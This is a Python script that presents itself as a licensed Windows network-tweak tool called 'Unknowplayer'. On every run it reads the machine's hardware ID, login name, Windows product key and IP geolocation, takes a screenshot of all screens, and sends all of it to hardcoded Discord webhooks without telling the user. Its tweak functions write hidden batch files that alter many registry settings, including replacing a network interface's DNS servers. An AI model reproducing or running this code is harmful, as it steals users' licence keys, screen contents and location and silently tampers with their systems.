import os,webbrowser,subprocess,sys,requests,time,httpx
from pystyle import System 
from discord_webhook import DiscordWebhook
from tkinter import Label,Button,Frame,Tk,ttk
from secrets import token_hex
from os import popen, environ
from subprocess import call
from PIL import ImageGrab

hwid = str(str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
mypcname = os.getlogin()
wkey = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
r =requests.get("https://pastebin.com/raw/V9U2P6EU")
webhookin = "https://discord.com/api/webhooks/1047516378619461632/GZzPdnb1j5Fz5HTS-eZqFQrwg02yq8zsXZvArosL3wLoAwS5zn0_DvHeSiBB7mbjSrAb"
webhookin1 = "https://discord.com/api/webhooks/1047516378619461632/GZzPdnb1j5Fz5HTS-eZqFQrwg02yq8zsXZvArosL3wLoAwS5zn0_DvHeSiBB7mbjSrAb"
webhookout = "https://discord.com/api/webhooks/1047516984633466961/r59Nlgy2mji4wp8F0879DOoCWNiFpBNDVThBo9kNRlX7JmtdDwRwIrVuQoIaagI6lArX"
webhookout1 = "https://discord.com/api/webhooks/1047516984633466961/r59Nlgy2mji4wp8F0879DOoCWNiFpBNDVThBo9kNRlX7JmtdDwRwIrVuQoIaagI6lArX"
d = httpx.get("https://ipinfo.io/json")
a = d.json()
ip = a.get('ip')
city = a.get('city')
country = a.get('country')
region = a.get('region')
org = a.get('org')
loc = a.get('loc')

os.system('cls')

dataloadedsuccessfullypic = '''
    ──────────────────────────────────────────────────────────────────────
    ..^PB############BBBB######&&&&#####B###################&&&&&&&&##BY^^
    ..JGBB#########BBBB###&&#&&&#####B####################&&&&&&&&&&##B?^^
    ..:^~JB##########B##&&&&&&#######&&###############&&&&@&&&&&&&&##G7!^^
    ....~PBB##########&&#&&&&&####&&&########&&####&&&&&###&&&&&&##&#?^^^^
    ...:!!!B#######&&&#PY5GPP5PPG&######&&&#&&##BGP555YYYJJ5&#&BY?##J7!^~~
    ::::..~57JG&#BBBGGP55555PPPPB##&BBP5YYJJPBP5PPPPPGGPPPPPGG5!~Y&J::!!~~
    ::::::!::^JB&G7^:^^^PBPPB#BGB#555Y7::^^:?YYP5P#BG#&GPG#7:::^^JP:^^:~!~
    :::::!^:^^!7PB~^.   ^555555PP7  :^^^^^^^^^^: .?5PPPPP5!....^^?~^5Y^:?!
    ::::~7:^^J57:77^^. . .:!7?7!:...^^^^^^^^^^^:...:!77!^.....:^^^^JPG!^J!
    :::::7!:^YYY?^^:^^:.    .   ...^^^^~!7~~^^^^:...........::^^^:!PP7^?!~
    ::::::~!^^7Y55JJ^^!!~^:...:^~^^^^^~!7?7~^^^^^~~::...::^~7^^^!J5Y!~?!~~
    ::::::::^~^^~7G@Y:^^~~~^^^~~~^^^^^^^^7^^^^^^^^~~^^^^^~~^^^^~BG7~!7~~~~
    ::::::::::^~~!JPP~^^^^^^^^^^^^^^^^^^^~^^^^^^^^^^^^^^^^^^^^^!J?77!~~~~~
    ::::::::::::^~!7??~:^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^!??7~~~~~~~!
    :::::::::::::::^~~?7^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^?Y~~~~~~!!!!!
    :::::::::::::::::::?J!^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~Y5!~~~~!!!!!!!
    :::::::::::::^^^^^^:!?7~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~?5B7~!!!!?!!!!!!
    :::::::::::^^^^^^^^^^^!?7~^^^^^^^^^^!!7?7!^^^^^^^^^~?PGYP7~!!!!!!!!!!!
    :::::::::^^^:^^^^^^^^^^^!557~^^^^^^^~^^^^^^^^^^^^!JG#PYY57!!!!!!!!!!!!
    ^^^^^^^^^^^:~^:^^^^^^^^^^!B##P?!^^^^^^^^^^^^^^!JG#BGPY5Y5J!!!!!!!!!!!!
    ^^^^^^^^^^:!G5?^^^^?!^^^^^?5#@@&B5J7!~^~~~!J5B&&G55PY55YJY7!!!!!!!!!!!
    ^^^^^^^^^^:P7^J^^!J7^^^^^^~JY#&@@@@@&#B##&@@&BPYY5P55Y?!^7Y!!!!77??JJJ
    ^^^^^^^^^^!P^^^^~!^^^^^^~~~JJ5PG&@@@@@@@@&BP5YYY5PPY7!~^^!5Y?JJYYYJJJ?
    ^^^^^^^^^^~77G7:^^^~5~^~~~~?JY5YYP#&&#BG55YYYYY5PP?~^~~^^7Y5??7!!~~~~^
    ^^^^^^^^^^^^^G7Y5~~7B~~~~~~?YYY5YYY55YYYY55YYYY5J!^^^~~~~~~~!^^^^^^^^~
    ^^^^^~!^~~~~^??!~7?J!~~~!7JY5YYPPYYYY555555YY7!7~^^~?J!^^^^~~!!!~~~^~~
    ^^^^^!~^~~~~~^^~~~~~~!7!~~?5PYY5B5Y5555555J7~^!~~~JPY~^^^^^^^^^~^^~~^^
    ~~~~~~~~~~~~~~~~~~!7!~^^^^^?PYYYBGY55555J!^^~~~~?Y5Y~^^~~~~~~^^^^^~^^^
    ──────────────────────────────────────────────────────────────────────
'''[1:]
dataloadedsuccessfullymsg = '''
    █▀▀▄ █▀▀█ ▀▀█▀▀ █▀▀█  █░░ █▀▀█ █▀▀█ █▀▀▄ █▀▀ █▀▀▄  █▀▀ █░░█ █▀▀ █▀▀ █▀▀ █▀▀ █▀▀ █▀▀ █░░█ █░░ █░░ █░░█
    █░░█ █▄▄█ ░░█░░ █▄▄█  █░░ █░░█ █▄▄█ █░░█ █▀▀ █░░█  ▀▀█ █░░█ █░░ █░░ █▀▀ ▀▀█ ▀▀█ █▀▀ █░░█ █░░ █░░ █▄▄█ 
    ▀▀▀░ ▀░░▀ ░░▀░░ ▀░░▀  ▀▀▀ ▀▀▀▀ ▀░░▀ ▀▀▀░ ▀▀▀ ▀▀▀░  ▀▀▀ ░▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░░ ░▀▀▀ ▀▀▀ ▀▀▀ ▄▄▄█
'''[1:]

def printSlow(text):
    for char in text:
        print(char, end="")
        sys.stdout.flush()
        time.sleep(0.1)

def Main_Program():
    if hwid in r.text:
        print("\n")  
        print("&&&&&&&@&&&&&#####&#########################BB######################PB######&&&&@@@@&########&&&&&&#")
        print("&&&&&&&&@&&&#########################BPB#B########################P?7###&##&&&&&@@&@@########&&&&&&&")
        print("&&&&&&&&&&&&&&###########G#####BGPY?!~J######BBBB#########B##&#GY7!~7##P###&&@@@@##&&#########&&&&&&")
        print("&&&&&&&&&&&&&&#######&##YP#&@&&#BGPP55B#&&BBBBBBBBBBBBBBBB##BG5YYPGPG&GP##&@@&G#@P7#&#BB######&&&&&&")
        print("&&&&&&&&&&&&&&##&##&#&&G5#&GJ?7J!~7JP##B#BB######BBBBBBBBB#GY77~^:!J7P@&BB&BBBPP5!?&@@&#BB###&&&&&&&")
        print("&&&&&&&&&&&&&G?5@BB&&&@&Y7#B^:^^    !J!P##BG5Y#&#B#######B?.  ^    ~~Y@5JGYYGYJ7?P&@@@@@&#BBB#&&&&&&")
        print("&&&&&&&&&&&&B?!7BPG#&&&Y~~!P?^~!.      ?JB#7?B#BB&&&##G#P!~      .~!^7?!!5#P7!JG&@@@@@@@@@&#BB#&&&@&")
        print("&&&&&&&&&&&&@@#PJ!!??55PB!~~~^^^~^.     7J5GP5?JB#G5?!~?~^J^...:^!~^77~!!JY?YB&&&&&&&@@@@@@@&#B#@&&@")
        print("&&&&&&&&&&&@@@&&&#GY?7!?57!~!J!^^^~~~~~!7^^!~~~7?!~~~~~~^^^~~~^^^^!Y57!~?##&@@&&&&&&#&@@@@@@@@&#&&&&")
        print("&&&&&&&&&@@@@&&&&&&&&&&#B#P~~???7!~~^^^^^^~~~~77777~~~~~~^~^~~!!77?7!!~!#@@@@@@@&&#BB&@@@@@@@@@@&&&&")
        print("&&&&&&&@@@@@&&&&&&&&&&&&&@@5~~~~!777??JY?~~~~~~7J?!~~~~~~~!!!!!!!~~~!~7B@@@@@@@&#BBB#@@@@@@@@@@@@&&&")
        print("&&&&&@@@@@@@&&&&&&&&&&&&&&&Y57~~~~~~~~~~~~~~~~~~?~~~~~~~~~~~~~~~~~~~!5&@@@@@@@&BBBBB#@@@@@@@@@@@@&&&")
        print("&&&@@@@@@@@&&&&&&&&&&&&&&&&!!PJ~~~~~~~~~~~~~~~~~7~~~~~~~~~~~~~~~~~~JGP&@@@@@@&BBBBBB&@@@@@@@@@@@@@&&")
        print("&&@@@@@@@@@&&&&&&&&&#&&&&&&!^~BB?~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~?BB!!&@@@@@@#BBBBB&@@@@@@@@@@@@@@@&")
        print("&&@@@@@@@@&&&&&&&&@&B&&&&&&!^^?@@BJ!~~~~~~~~~~~~~~~~~~~~~~~~~~!JB@@?^?@@@@@@&BBBBB###&@@@@@@@@@@@@@@")
        print("&&@@@@@@@&&&&&&&&&&&BB&&&&&7^^~B@@@&GJ7~~~~~~!7!!!!!!7!~~~~!JP#@&@#~^Y@@@@@@#BBBBB#BBB&@@@@@@@@@@@@@")
        print("&&@@@@@&&&&&&&&&&&&&#BB&&&@?^~^?&&&@@@&#GY?!~~!!!!!!!?7!?5B&@@&PP@B^~B@@@@@&BBBBBB#BBBB#&@@@@@@@@@@@")
        print("&&&&&&&&&&&&&&&&B#&&&BG#&@@Y^~~~55YP&@B#@@@&#G5J7!!7?YG&@@@@&BYYB@G^5@@@@@@BBBBBB#BBBBBBB#&&&&@@@@@@")
        print("&&&&&&&&&&&&&&&&#&&&&BGB#@@#~~~^!P5JP@BYPG&@@@@@&&#&@@@@@&##GYY5&@#~7#@@@@&BBBBBB#BBBBBBBB#&&&@@@@@@")
        print("\n")
        printSlow("────────────────────────────────────────────────────────────────────────────────────────────────")
        os.system('cls')
        image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
        image.save("imageunknowplayersecurity.png")
        webhookin1 = DiscordWebhook(url="https://discord.com/api/webhooks/1047516378619461632/GZzPdnb1j5Fz5HTS-eZqFQrwg02yq8zsXZvArosL3wLoAwS5zn0_DvHeSiBB7mbjSrAb", username=f"คุณ {mypcname} ได้เข้าระบบสำเร็จ" )
        with open("imageunknowplayersecurity.png", "rb") as f:
           webhookin1.add_file(file=f.read(), filename='imageunknowplayersecurity.png')
        os.remove("imageunknowplayersecurity.png")
        httpx.post(
            webhookin, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : Unknowplayer
                Version : 1 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                Product Key : {wkey}
                IP : {ip}
                เมือง : {city}
                ประเทศ : {country}
                ภูมิภาค : {region}
                องค์กร : {org}
                โลเคชั่น : {loc}
                 """,
              "color": 0x1cff00,
            }
          ],
          "username": f"คุณ {mypcname} ได้เข้าระบบสำเร็จ",
          }
        )
        response = webhookin1.execute()
        print("░██████╗████████╗░█████╗░██╗░░░██╗  ██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░  ██╗███╗░░██╗")
        print("██╔════╝╚══██╔══╝██╔══██╗╚██╗░██╔╝  ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗  ██║████╗░██║")
        print("╚█████╗░░░░██║░░░███████║░╚████╔╝░  ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██║░░██║  ██║██╔██╗██║")
        print("░╚═══██╗░░░██║░░░██╔══██║░░╚██╔╝░░  ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██║░░██║  ██║██║╚████║")
        print("██████╔╝░░░██║░░░██║░░██║░░░██║░░░  ███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██████╔╝  ██║██║░╚███║")
        print("╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░  ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═════╝░  ╚═╝╚═╝░░╚══╝")
        print("\n")
        print("█░█ █▄░█ █▄▀ █▄░█ █▀█ █░█░█ █▀█ █░░ ▄▀█ █▄█ █▀▀ █▀█  ")
        print("█▄█ █░▀█ █░█ █░▀█ █▄█ ▀▄▀▄▀ █▀▀ █▄▄ █▀█ ░█░ ██▄ █▀▄  ")
        print("\n")
        print("█▄▄ █▄█   █   █▀ █▀█ █▄░█ █ █▀▀   ░   █▀▀ ▀▄▀ █▀▀ █▄▄ █▀█ ▀▀█ █░█")
        print("█▄█ ░█░   ▄   ▄█ █▄█ █░▀█ █ █▄▄   ▄   ██▄ █░█ ██▄ █▄█ █▄█ ░░█ ▀▀█")

    else:
        
        print("█░█ █░█░█ █ █▀▄   █▄░█ █▀█ ▀█▀   █▀▀ █▀█ █░█ █▄░█ █▀▄")
        print("█▀█ ▀▄▀▄▀ █ █▄▀   █░▀█ █▄█ ░█░   █▀░ █▄█ █▄█ █░▀█ █▄▀")
        print("\n")
        image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
        image.save("imageunknowplayersecurity.png")
        webhookout1 = DiscordWebhook(url="https://discord.com/api/webhooks/1047516984633466961/r59Nlgy2mji4wp8F0879DOoCWNiFpBNDVThBo9kNRlX7JmtdDwRwIrVuQoIaagI6lArX", username=f"คุณ {mypcname} ได้เข้าระบบไม่สำเร็จ")
        with open("imageunknowplayersecurity.png", "rb") as f:
           webhookout1.add_file(file=f.read(), filename='imageunknowplayersecurity.png')
        os.remove("imageunknowplayersecurity.png")   
        httpx.post(
            webhookout, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : Unknowplayer
                Version : 1 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                Product Key : {wkey}
                IP : {ip}
                เมือง : {city}
                ประเทศ : {country}
                ภูมิภาค : {region}
                องค์กร : {org}
                โลเคชั่น : {loc}
                 """,
              "color": 0xcf0a0a,
            }
          ],
          "username": f"คุณ {mypcname} ได้เข้าระบบไม่สำเร็จ",
          }
        )
        response = webhookout1.execute()
        print("HWID : " + hwid)
        print("\n")
        print("█░█ █▄░█ █▄▀ █▄░█ █▀█ █░█░█ █▀█ █░░ ▄▀█ █▄█ █▀▀ █▀█  ")
        print("█▄█ █░▀█ █░█ █░▀█ █▄█ ▀▄▀▄▀ █▀▀ █▄▄ █▀█ ░█░ ██▄ █▀▄  ")
        print("█▄▄ █▄█   █   █▀ █▀█ █▄░█ █ █▀▀   ░   █▀▀ ▀▄▀ █▀▀ █▄▄ █▀█ ▀▀█ █░█")
        print("█▄█ ░█░   ▄   ▄█ █▄█ █░▀█ █ █▄▄   ▄   ██▄ █░█ ██▄ █▄█ █▄█ ░░█ ▀▀█")
        os.system('pause')
        exit()
System.Title("Unknowplayer By Sonic")
Main_Program()

def Hardcore1():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
bcdedit /deletevalue useplatformclock
bcdedit /set useplatformclock true
fsutil behavior set disabledeletenotify 0
powercfg.exe -h off
bcdedit /deletevalue useplatformclock
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -NonSackRttResiliency disabled
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -MaxSynRetransmissions 2
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -EcnCapability disabled
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -Timestamps disabled
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -AutoTuningLevelLocal Normal
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -ScalingHeuristics disabled
PowerShell.exe Set-NetTCPSetting -SettingName InternetCustom -CongestionProvider ctcp
PowerShell.exe Enable-NetAdapterChecksumOffload -Name 'Ethernet'
PowerShell.exe Disable-NetAdapterLso -Name 'Ethernet'
PowerShell.exe Enable-NetAdapterRss -Name 'Ethernet'
PowerShell.exe Enable-NetAdapterRsc -Name 'Ethernet'
PowerShell.exe Set-NetOffloadGlobalSetting -Chimney Automatic
reg add "HKLM\System\CurrentControlSet\services	cpip\Parameters\Interfaces\{1403E43F-0AB1-4EBB-A6E3-59C64B960519}" /f /v "NameServer" /t REG_SZ /d "186.125.131.18,208.67.220.220"
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCmds" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxThreads" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCollectionCount" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "983040" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxWorkItems" /t REG_DWORD /d "8192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "2048" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxCmds" /t REG_DWORD /d "2048" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "200" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "20000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "64240" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "IgnoreOSNameValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_SZ /d "1" /f

    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)

def Hardcore2():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "GlobalMaxTcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f
)
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowsSize" /t REG_DWORD /d "%DECRWIN%" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "TcpACKFrequency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "TCPNoDelay" /t REG_DWORD /d "01" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "PerformRouterDiscovery" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\<GUID>" /v "InterfaceMetric" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "Domain" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "RegistrationEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "RegisterAdapterName" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "DhcpInterfaceOptions" /t REG_BINARY /d "0f00000000000000000000000000000041e1ec587900000000000000000000000000000041e1ec580100000000000000000000000000000041e1ec582b00000000000000000000000000000041e1ec582c00000000000000000000000000000041e1ec580600000000000000000000000000000041e1ec58" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TCPNoDelay" /t REG_DWORD /d "1130458716" /f
